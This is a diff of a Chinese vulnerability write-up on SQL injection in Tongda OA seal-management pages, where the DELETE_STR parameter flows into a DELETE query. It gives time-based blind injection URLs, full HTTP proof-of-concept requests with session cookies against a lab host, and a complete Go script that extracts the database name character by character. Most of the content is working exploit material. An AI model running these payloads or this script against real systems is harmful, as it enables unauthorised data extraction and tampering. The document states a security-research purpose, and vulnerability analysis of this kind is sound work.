@@ -38,13 +38,13 @@ _声明：__** 文章中涉及的内容可能带有攻击性，仅供安全研�
 
 ```
 <?php
-require_once "inc/auth.inc.php";
-include_once "inc/header.inc.php";
-include_once "inc/utility_all.php";
-$CUR_TIME = date("Y-m-d H:i:s", time());
-$DELETE_STR = rtrim($DELETE_STR, ",");
-$query = "delete from office_seal WHERE ID IN ($DELETE_STR)";
-exequery(TD::conn(), $query);
+require_once "inc/auth.inc.php";
+include_once "inc/header.inc.php";
+include_once "inc/utility_all.php";
+$CUR_TIME = date("Y-m-d H:i:s", time());
+$DELETE_STR = rtrim($DELETE_STR, ",");
+$query = "delete from office_seal WHERE ID IN ($DELETE_STR)";
+exequery(TD::conn(), $query);
 header("location:manage.php?start=$start");
 ?>
 
@@ -52,14 +52,14 @@ header("location:manage.php?start=$start");
 
 ```
 
-实现的功能是从数据库中删除指定的记录。前面三句是包含其它文件进来。然后第四句开始是创建了一个名为 的变量，保存当前时间。当前时间可能是为了记录删除操作的时间戳。对 DELETE_STR 变量进行处理，使用 rtrim()  函数去掉末尾的逗号（,）。然后是构造了一个 SQL 查询语句，使用 $DELETE_STR 中的值作为 ID 列的筛选条件。
+实现的功能是从数据库中删除指定的记录。前面三句是包含其它文件进来。然后第四句开始是创建了一个名为 的变量，保存当前时间。当前时间可能是为了记录删除操作的时间戳。对 DELETE_STR 变量进行处理，使用 rtrim()  函数去掉末尾的逗号（,）。然后是构造了一个 SQL 查询语句，使用 $DELETE_STR 中的值作为 ID 列的筛选条件。
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/u3BDsxBAuibWJBmvOUYuDxY4Bf2tFvicCvr7RMI7Hla4chP2ibxExDV7DepP7mluwPAIeuicEbUpufUdf0e2QickICA/640?wx_fmt=png)
 
 调用 exequery() 函数执行 SQL 查询；使用 header() 函数将请求重定向到另一个页面。
 
 ```
-exequery(TD::conn(), $query);
+exequery(TD::conn(), $query);
 header("location:manage.php?start=$start");
 
 
@@ -82,7 +82,7 @@ header("location:manage.php?start=$start");
 尝试进行注入，试一下有没有过滤 sleep
 
 ```
-http://192.168.88.131/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1) and if(1 =1,sleep(5),1) AND (1) = (1
+http://192.168.88.131/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1) and if(1 =1,sleep(5),1) AND (1) = (1
 
 
 ```
@@ -106,16 +106,16 @@ inc/auth.inc.php(3)--->inc/session.php(77)--->inc/conn.php---(sql_injection)
 尝试使用网传的 poc 进行请求
 
 ```
-GET /general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(83)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
-Host: 192.168.88.131
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Connection: close
-Upgrade-Insecure-Requests: 1
-Cookie: Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3d564868; PHPSESSID=po5cp18o8mov6bk99cd338a7e1
-Cache-Control: max-age=0
+GET /general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(83)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
+Host: 192.168.88.131
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cookie: Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3d564868; PHPSESSID=po5cp18o8mov6bk99cd338a7e1
+Cache-Control: max-age=0
 
 
 ```
@@ -139,13 +139,13 @@ char(83) 未延迟
 
 ```
 <?php
-require_once "inc/auth.inc.php";
-include_once "inc/header.inc.php";
-if (substr($DELETE_STR, -1, 1) == ",") {
- $DELETE_STR = substr($DELETE_STR, 0, -1);
+require_once "inc/auth.inc.php";
+include_once "inc/header.inc.php";
+if (substr($DELETE_STR, -1, 1) == ",") {
+ $DELETE_STR = substr($DELETE_STR, 0, -1);
 }
-$query = "delete from SEAL_LOG WHERE LOG_ID IN ($DELETE_STR)";
-exequery(TD::conn(), $query);
+$query = "delete from SEAL_LOG WHERE LOG_ID IN ($DELETE_STR)";
+exequery(TD::conn(), $query);
 header("location:log.php?start=$start");
 ?>
 
@@ -159,16 +159,16 @@ header("location:log.php?start=$start");
 我们就直接上 POC 了，POC 和上面一模一样。
 
 ```
-GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
-Host: 192.168.88.131
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Connection: close
-Upgrade-Insecure-Requests: 1
-Cookie: Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=4fb6c477; PHPSESSID=brpsncea78tf3qv8jgpdr69d20
-Cache-Control: max-age=0
+GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
+Host: 192.168.88.131
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cookie: Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=4fb6c477; PHPSESSID=brpsncea78tf3qv8jgpdr69d20
+Cache-Control: max-age=0
 
 
 ```
@@ -189,74 +189,74 @@ Cache-Control: max-age=0
 使用 go 编码的简单脚本，测试的 POC 是用于枚举当前所使用的数据库名称。
 
 ```
-package main
+package main
 
-import (
- "fmt"
- "net/http"
- "strings"
- "time"
+import (
+ "fmt"
+ "net/http"
+ "strings"
+ "time"
 )
 
-func main() {
+func main() {
 
- url := "http://192.168.88.131/general/system/seal_manage/dianju/delete_log.php"                                                                                     // 目标网站的URL
- delay := 2                                                                                                                                                          // 延迟时间，单位为秒
- cookieValue := "Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3d564868; PHPSESSID=po5cp18o8mov6bk99cd338a7e1" // 替换为有效的Cookie值
+ url := "http://192.168.88.131/general/system/seal_manage/dianju/delete_log.php"                                                                                     // 目标网站的URL
+ delay := 2                                                                                                                                                          // 延迟时间，单位为秒
+ cookieValue := "Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3d564868; PHPSESSID=po5cp18o8mov6bk99cd338a7e1" // 替换为有效的Cookie值
 
- characters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*()+-" // 可能的字符集
+ characters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*()+-" // 可能的字符集
 
- result := ""
- for i := 1; i <= 30; i++ { // 假设字符的最大长度为30
-  found := false
-  for _, char := range characters {
-   payload := fmt.Sprintf("1) and (substr(DATABASE(),%d,1))=char(%d) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1", i, int(char)) // 构造payload
-   //print(payload, "\n")
-   req, err := http.NewRequest("GET", url, nil)
-   if err != nil {
-    fmt.Println("创建请求失败:", err)
-    return
-   }
+ result := ""
+ for i := 1; i <= 30; i++ { // 假设字符的最大长度为30
+  found := false
+  for _, char := range characters {
+   payload := fmt.Sprintf("1) and (substr(DATABASE(),%d,1))=char(%d) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1", i, int(char)) // 构造payload
+   //print(payload, "\n")
+   req, err := http.NewRequest("GET", url, nil)
+   if err != nil {
+    fmt.Println("创建请求失败:", err)
+    return
+   }
 
-   // 使用分号分隔的每个Cookie项
-   cookieItems := strings.Split(cookieValue, "; ")
-   for _, item := range cookieItems {
-    itemSplit := strings.SplitN(item, "=", 2) // 按照等号（=）分隔键值对
-    if len(itemSplit) == 2 {
-     cookie := &http.Cookie{
-      Name:  itemSplit[0],
-      Value: itemSplit[1],
-     }
-     req.AddCookie(cookie)
-    }
-   }
+   // 使用分号分隔的每个Cookie项
+   cookieItems := strings.Split(cookieValue, "; ")
+   for _, item := range cookieItems {
+    itemSplit := strings.SplitN(item, "=", 2) // 按照等号（=）分隔键值对
+    if len(itemSplit) == 2 {
+     cookie := &http.Cookie{
+      Name:  itemSplit[0],
+      Value: itemSplit[1],
+     }
+     req.AddCookie(cookie)
+    }
+   }
 
-   req.URL.RawQuery = "DELETE_STR=" + payload //构建请求，其DELETE_STR是本次的注入参数
+   req.URL.RawQuery = "DELETE_STR=" + payload //构建请求，其DELETE_STR是本次的注入参数
 
-   startTime := time.Now()
-   resp, err := http.DefaultClient.Do(req)
-   if err != nil {
-    fmt.Println("发送请求失败:", err)
-    return
-   }
-   defer resp.Body.Close()
+   startTime := time.Now()
+   resp, err := http.DefaultClient.Do(req)
+   if err != nil {
+    fmt.Println("发送请求失败:", err)
+    return
+   }
+   defer resp.Body.Close()
 
-   endTime := time.Now()
-   responseTime := endTime.Sub(startTime)
+   endTime := time.Now()
+   responseTime := endTime.Sub(startTime)
 
-   if responseTime >= time.Duration(delay)*time.Second {
-    result += string(char)
-    found = true
-    break
-   }
-  }
+   if responseTime >= time.Duration(delay)*time.Second {
+    result += string(char)
+    found = true
+    break
+   }
+  }
 
-  if !found {
-   break
-  }
- }
+  if !found {
+   break
+  }
+ }
 
- fmt.Println("Database: " + result)
+ fmt.Println("Database: " + result)
 }
 
 
